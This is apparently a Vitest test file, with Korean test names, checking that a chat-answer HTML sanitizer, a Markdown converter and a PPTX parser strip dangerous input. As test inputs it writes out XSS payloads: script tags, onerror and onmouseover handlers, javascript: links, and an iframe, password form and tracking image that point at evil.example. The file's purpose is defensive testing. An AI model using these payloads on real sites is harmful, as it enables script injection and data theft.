import { describe, expect, it } from "vitest";
import JSZip from "jszip";
import { isExternalLink, renderMarkdownSafe, sanitizeHtml } from "./sanitize";
import { markdownToHtml } from "../docs/markdown";
import { parsePptx, safeFontName, safeHex } from "../docs/pptx";

describe("채팅 답변 HTML 정화", () => {
  it("스크립트와 이벤트 처리기를 없앤다", () => {
    const html = renderMarkdownSafe(
      [
        "안녕하세요",
        "<script>window.__pwned = 1</script>",
        '<img src="x" onerror="window.__pwned = 2">',
        '<a href="javascript:alert(1)">클릭</a>',
        '<iframe src="https://evil.example"></iframe>',
        '<form action="https://evil.example"><input name="pw"><button>보내기</button></form>',
        '<div style="background:url(https://evil.example/t.png)">x</div>',
        "<svg><script>alert(1)</script></svg>",
      ].join("\n\n")
    );
    expect(html).toContain("안녕하세요");
    expect(html).not.toMatch(/<script|onerror|javascript:|<iframe|<form|<button|style=|<svg/i);
  });

  it("일반 Markdown 서식과 안전한 링크는 유지한다", () => {
    const html = renderMarkdownSafe(
      "# 제목\n\n**굵게** `코드`\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n- [x] 완료\n\n[문서](https://example.com/doc)"
    );
    expect(html).toContain("<h1>제목</h1>");
    expect(html).toContain("<strong>굵게</strong>");
    expect(html).toContain("<table>");
    expect(html).toMatch(/<a href="https:\/\/example.com\/doc" rel="noopener noreferrer">문서<\/a>/);
  });

  it("외부 이미지는 막고 내장 이미지는 남긴다", () => {
    const tracked = sanitizeHtml('<img src="https://evil.example/leak?d=secret">');
    expect(tracked).not.toContain("evil.example");
    const inline = sanitizeHtml('<img src="data:image/png;base64,iVBORw0KGgo=">');
    expect(inline).toContain("data:image/png;base64");
    expect(sanitizeHtml('<img src="data:text/html;base64,PHNjcmlwdD4=">')).not.toContain("data:text");
  });

  it("target 속성을 지워 새 창이 열리지 않게 한다", () => {
    const html = sanitizeHtml('<a href="https://example.com" target="_blank">x</a>');
    expect(html).not.toContain("target");
  });

  it("외부로 열 수 있는 링크만 허용한다", () => {
    expect(isExternalLink("https://example.com")).toBe(true);
    expect(isExternalLink("mailto:a@b.c")).toBe(true);
    expect(isExternalLink("javascript:alert(1)")).toBe(false);
    expect(isExternalLink("file:///C:/Windows")).toBe(false);
    expect(isExternalLink(null)).toBe(false);
  });

  it("캔버스용 Markdown 변환도 원시 HTML을 거른다", () => {
    const html = markdownToHtml('본문\n\n<img src=x onerror="alert(1)">\n\n<script>alert(2)</script>');
    expect(html).toContain("본문");
    expect(html).not.toMatch(/onerror|<script/i);
  });
});

describe("PPTX에서 읽은 색·글꼴 값 검증", () => {
  it("6자리 16진수 색만 받는다", () => {
    expect(safeHex("a50034")).toBe("A50034");
    expect(safeHex('000000" onmouseover="alert(1)')).toBeUndefined();
    expect(safeHex("red;background:url(x)")).toBeUndefined();
    expect(safeHex(null)).toBeUndefined();
  });

  it("글꼴 이름에서 CSS·HTML 특수 문자를 없앤다", () => {
    expect(safeFontName("맑은 고딕")).toBe("맑은 고딕");
    expect(safeFontName("+mn-lt")).toBe("+mn-lt");
    expect(safeFontName('Arial"><img src=x onerror=alert(1)>')).toBe("Arialimg srcx onerroralert1");
    expect(safeFontName("';}")).toBeUndefined();
  });

  it("악성 색 값이 들어 있는 슬라이드도 안전하게 읽는다", async () => {
    const zip = new JSZip();
    const ns =
      'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"';
    zip.file(
      "[Content_Types].xml",
      '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'
    );
    zip.file(
      "ppt/presentation.xml",
      `<?xml version="1.0"?><p:presentation ${ns}><p:sldIdLst><p:sldId id="256" r:id="rId1"/></p:sldIdLst><p:sldSz cx="12192000" cy="6858000"/></p:presentation>`
    );
    zip.file(
      "ppt/_rels/presentation.xml.rels",
      '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide1.xml"/></Relationships>'
    );
    zip.file(
      "ppt/slides/slide1.xml",
      `<?xml version="1.0"?><p:sld ${ns}><p:cSld><p:spTree><p:sp><p:nvSpPr><p:cNvPr id="2" name="t"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="100" cy="100"/></a:xfrm></p:spPr><p:txBody><a:bodyPr/><a:p><a:r><a:rPr><a:solidFill><a:srgbClr val='000" onmouseover="alert(1)'/></a:solidFill><a:latin typeface='X"&gt;&lt;img src=x onerror=alert(1)&gt;'/></a:rPr><a:t>제목</a:t></a:r></a:p></p:txBody></p:sp></p:spTree></p:cSld></p:sld>`
    );
    const bytes = await zip.generateAsync({ type: "uint8array" });
    const { deck } = await parsePptx(bytes);
    const runs = deck.slides.flatMap((s) => s.shapes.flatMap((sh) => sh.paragraphs.flatMap((p) => p.runs)));
    const run = runs.find((r) => r.text === "제목");
    expect(run).toBeDefined();
    expect(run!.color ?? "#000000").toMatch(/^#[0-9A-F]{6}$/);
    expect(run!.font ?? "").not.toMatch(/["<>=]/);
  });
});
